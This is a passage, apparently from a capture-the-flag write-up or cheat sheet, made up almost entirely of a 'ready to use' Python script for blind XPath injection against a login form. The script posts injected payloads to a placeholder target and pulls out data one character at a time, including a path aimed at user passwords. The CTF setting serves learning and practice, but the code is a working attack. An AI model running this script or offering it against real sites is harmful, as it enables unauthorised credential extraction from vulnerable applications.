...
### Complete Blind Extraction Script (Python)

```python
#!/usr/bin/env python3
"""XPath Blind Extraction - Ready to use"""
import requests
import string

URL = "http://target.com/"
FIELD_USER = "name"      # Adjust field names
FIELD_PASS = "pass"
SUCCESS = "right path"   # Text on TRUE condition
CHARSET = string.ascii_lowercase + string.digits + "_{}-"

def test(payload):
    r = requests.post(URL, data={FIELD_USER: payload, FIELD_PASS: "x"})
    return SUCCESS.lower() in r.text.lower()

# Common paths to try
PATHS = ["//*[contains(.,'flag')]", "//*[contains(.,'pico')]", "//user/password", "//secret"]

for xpath in PATHS:
    # Find length
    for length in range(1, 100):
        if test(f"' or string-length({xpath})={length} and '1'='1"):
            print(f"[+] {xpath} length: {length}")
            # Extract
            flag = ""
            for pos in range(1, length+1):
                for c in CHARSET:
                    if test(f"' or substring({xpath},{pos},1)='{c}' and '1'='1"):
                        flag += c
                        print(f"    {flag}")
                        break
            print(f"[+] RESULT: {flag}")
